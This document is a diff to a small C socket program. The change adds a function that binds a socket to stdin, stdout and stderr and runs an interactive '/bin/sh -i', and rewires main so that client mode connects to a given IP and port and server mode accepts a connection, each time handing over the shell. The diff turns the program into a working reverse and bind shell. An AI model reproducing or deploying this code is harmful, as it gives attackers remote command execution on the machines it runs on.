@@ -12,7 +12,6 @@ int client_s(char* ip, int port) {
         perror("socket: ");
         exit(EXIT_FAILURE);
     }
-    serv = {0};
     serv.sin_family = AF_INET;
     serv.sin_port = htons(port);
     serv.sin_addr.s_addr = inet_addr(ip);
@@ -44,19 +43,33 @@ int server_s(int port) {
         exit(EXIT_FAILURE);
     }
     clen = sizeof(struct sockaddr_in);
-    if ((s1 = accept(s, (struct sockaddr*) &client, clen)) < 0) {
+    if ((s1 = accept(s, (struct sockaddr*) &client, &clen)) < 0) {
         perror("accept ");
         exit(EXIT_FAILURE);
     }
 
     return s1;
 }
+int start_shell(s) {
+    char* name[3];
+    
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
+    
+    name[0] = "/bin/sh";
+    name[1] = "-i";
+    name[2] = NULL;
+    execv(name[0], name);
+    exit(1);
 
-int main(int argc, char** args) {
-    if (argc[1][0] == 'c') {
-        client_s(args[1], args[2]);
+    return 0;
+}
+int main(int argc, char** argv) {
+    if (argv[1][0] == 'c') {
+        start_shell(client_s(argv[2], atoi(argv[3])));
     } else {
-        server_s(args[1]);
+        start_shell(server_s(atoi(argv[2])));
     }
     
     return 0;
